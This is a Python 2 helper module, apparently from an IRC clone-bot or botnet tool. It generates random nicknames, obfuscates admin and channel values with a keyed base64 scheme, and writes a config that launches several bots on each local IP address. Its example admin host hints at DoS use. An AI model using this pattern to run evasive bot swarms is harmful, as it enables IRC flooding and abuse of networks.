import re, base64, random, string, fcntl, array, struct, socket, platform, getpass
from Vars import VERSION, CODER, NAMES, DEK, PG, CONFIG_FILE

def PrintWelcome():
    printmsg = '[+] %s\n[+] Creat de %s'
    print printmsg % (VERSION, CODER)


def goodnickname(nick):
    mt = re.compile('^[a-zA-Z_^`][a-zA-Z0-9_\\-^`]{1,11}$')
    if mt.match(nick):
        return True
    else:
        return False


def goodident(ident):
    mt = re.compile('^[a-zA-Z]{1,9}$')
    if mt.match(ident):
        return True
    else:
        return False


def encode(clear, key = DEK):
    enc = []
    for i in range(len(clear)):
        key_c = key[i % len(key)]
        enc_c = chr((ord(clear[i]) + ord(key_c)) % 256)
        enc.append(enc_c)

    return base64.urlsafe_b64encode(''.join(enc))


def decode(enc, key = DEK):
    dec = []
    enc = base64.urlsafe_b64decode(enc)
    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)

    return ''.join(dec)


def randnick():
    nick = None
    while nick is None or len(nick) > 11:
        nick = random.choice(NAMES.split())

    ln = len(nick)
    n = random.randint(min(2, 12 - ln), 12 - ln)
    for _ in range(n):
        nick += random.choice(string.letters)

    return nick


def idle2str(timevar):
    d = timevar / 86400
    timevar -= d * 86400
    h = timevar / 3600
    timevar -= h * 3600
    m = timevar / 60
    s = timevar % 60
    return '%d days %-2.2d:%-2.2d:%-2.2d' % (d,
     h,
     m,
     s)


def enqueue_output(out, queue):
    for line in out:
        queue.put(line[:-1])

    out.close()


def localifs():
    """
    Used to get a list of the up interfaces and associated IP addresses
    on this machine (linux only).
    
    Returns:
        List of interface tuples.  Each tuple consists of
        (interface name, interface IP)
    """
    SIOCGIFCONF = 35090
    MAXBYTES = 8096
    arch = platform.architecture()[0]
    if arch == '32bit':
        var1 = 32
        var2 = 32
    elif arch == '64bit':
        var1 = 16
        var2 = 40
    else:
        raise OSError('Unknown architecture: %s' % arch)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    names = array.array('B', '\x00' * MAXBYTES)
    outbytes = struct.unpack('iL', fcntl.ioctl(sock.fileno(), SIOCGIFCONF, struct.pack('iL', MAXBYTES, names.buffer_info()[0])))[0]
    namestr = names.tostring()
    return [ (namestr[i:i + var1].split('\x00', 1)[0], socket.inet_ntoa(namestr[i + 20:i + 24])) for i in xrange(0, outbytes, var2) ]


def generate_config(filename = CONFIG_FILE):
    passwd = getpass.getpass()
    if encode(passwd) != PG:
        print 'Wrong password.'
        return
    servers = []
    nservers = 0
    admins = []
    nadmins = 0
    nbots = 2
    channel = ()
    print '[+] Enter servers name and port (port is optional and is delimited by space) :'
    while True:
        port = 6667
        nservers += 1
        server = raw_input('Server/[port] (%d): ' % nservers)
        if not server:
            break
        server = server.split()
        if len(server) > 1:
            try:
                port = int(server[1])
            except:
                pass

        servers.append((server[0], port))

    print '[+] Enter admin hostname (full hostname, ex: DOS.users.undernet.org) :'
    while True:
        nadmins += 1
        admin = raw_input('Admin (%d): ' % nadmins)
        if not admin:
            break
        admins.append(admin)

    print '[+] Number of bots per ip (defapt is %d) :' % nbots
    try:
        n = int(raw_input(': '))
        if n > 0 and n < 6:
            nbots = n
    except:
        pass

    print '[+] Channel for bots (with #, key is optional and is delimited by space) :'
    channel = raw_input(': ')
    try:
        fh = open(filename, 'w')
        for s in servers:
            fh.write('SERVER %s %d\n' % (s[0], s[1]))

        for a in admins:
            fh.write('ADMIN %s\n' % encode(a))

        botcount = 0
        for x in localifs():
            if x[0] != 'lo':
                for y in xrange(nbots):
                    botcount += 1
                    ident = random.choice(NAMES.split())
                    fh.write('######### bot %d #########\n' % botcount)
                    fh.write('IDENT %s\n' % ident)
                    fh.write('REALNAME %s\n' % ident)
                    fh.write('VHOST %s\n' % x[1])
                    fh.write('CHANNEL %s\n' % encode(channel))

        print '[+] Config generat cu success.'
    except:
        print '[-] Something were wrong with config generation.'
    finally:
        fh.close()
